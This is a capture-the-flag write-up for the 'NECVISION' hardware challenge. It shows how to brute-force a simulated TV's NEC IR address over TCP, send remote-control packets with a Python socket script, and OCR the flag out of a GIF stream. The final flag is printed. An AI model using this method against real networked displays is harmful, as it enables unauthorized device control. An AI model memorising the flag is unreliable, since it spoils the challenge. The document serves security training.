# NECVISION

## Category
Hardware

## Difficulty
Medium

## Challenge Description

Task Force Nightfall has temporary control of compromised phones scattered through a major public event, each one capable of acting as an IR blaster. Rival operators are using the venue's NECVISION display wall as a propaganda channel, hijack the control path, suppress their broadcast, and force the screens onto our own feed before the narrative locks in.

**Creator:** Xclow3n

## Summary
A simulated consumer TV exposes NEC IR remote control over TCP and a streaming API. The flag is displayed in a proprietary GIF stream accessible only at a specific input and channel combination. The solution requires brute-forcing the NEC IR device address, mapping control commands, navigating to the correct input and channel, and extracting the flag via OCR.

## Provided Files
None (Docker instance only)

## Tools Used
- Python 3
- socket
- curl
- PIL (Pillow)
- Tesseract OCR

## Walkthrough

### Step 1: Identify the NEC IR Device Address

NEC IR packets are four bytes: `[address, ~address, command, ~command]`. The TV's address byte must be discovered by brute force across the full 0x00-0xFF range. Send a power-on command (0x45) with each candidate address and observe which produces a response.

The TV's address is `0x42`.

### Step 2: Map Control Commands

Send known NEC button codes to the IR port at TCP `<target-ip>:31303`:
- Power: `0x45`
- Channel+: `0x16`
- Input switch (cycles inputs): `0x1b`

### Step 3: Reset the TV

```bash
curl -X POST http://<target-ip>:<target-port>/api/reset
```

### Step 4: Navigate to the Flag

Power on the TV, cycle through inputs 7 times to reach the SCART input, then navigate to channel 24 by pressing channel-up 23 times.

```python
import socket, time

IR = ('<target-ip>', 31303)

def send(cmd):
    s = socket.socket()
    s.connect(IR)
    s.send(bytes([0x42, 0xBD, cmd, cmd ^ 0xFF]))
    s.close()
    time.sleep(0.35)

send(0x45)              # power on
for _ in range(7):
    send(0x1b)          # cycle to SCART input
for _ in range(23):
    send(0x16)          # channel up to 24
```

### Step 5: Fetch and OCR the Flag GIF

Request the stream from the API. The server returns a GIF at `/static/<hash>.gif`. Upscale the frame 3x before running Tesseract to improve OCR accuracy on the animated Matrix-style background.

```python
from PIL import Image
import subprocess, re

im = Image.open('flag.gif')
frame = im.copy().convert('RGB')
w, h = frame.size
large = frame.resize((w * 3, h * 3), Image.LANCZOS)
large.save('/tmp/flag_frame.png')

r = subprocess.run(
    ['tesseract', '/tmp/flag_frame.png', 'stdout', '--psm', '6'],
    capture_output=True, text=True
)
m = re.search(r'HTB\{[^}]+\}', r.stdout)
if m:
    print(m.group(0))
```

## Key Findings
- The TV's NEC IR address is `0x42`; invalid addresses produce no response, making brute force across 256 candidates feasible
- Nine GIFs served by the API are decoy content; the flag GIF is served only when the TV is set to SCART input, channel 24
- The flag GIF uses a Matrix-style animated background with bright white text; 3x upscaling is required for reliable OCR

## Final Answer
`Flag: HTB{5w1tch_it_up_c0d3_it_up_w1th_n3c}`

## Lessons Learned
Industrial and consumer hardware interfaces (IR, serial, OCPP) exposed over TCP provide the same attack surface as network APIs. Brute-forcing a single-byte address space (256 candidates) is trivial and requires no prior knowledge. Animated GIF OCR requires explicit frame extraction and image preprocessing (upscaling, contrast enhancement) before text recognition can succeed reliably.
